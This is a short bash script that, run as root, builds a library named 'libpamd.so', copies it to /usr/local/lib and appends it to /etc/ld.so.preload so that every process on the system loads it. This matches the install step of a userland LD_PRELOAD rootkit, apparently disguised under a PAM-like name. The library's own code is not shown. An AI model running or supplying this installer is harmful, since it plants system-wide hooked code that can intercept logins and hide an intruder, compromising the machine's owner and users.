#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

apt-get install gcc make cmake
make

sudo mv libpamd.so /usr/local/lib/
echo /usr/local/lib/libpamd.so >> /etc/ld.so.preload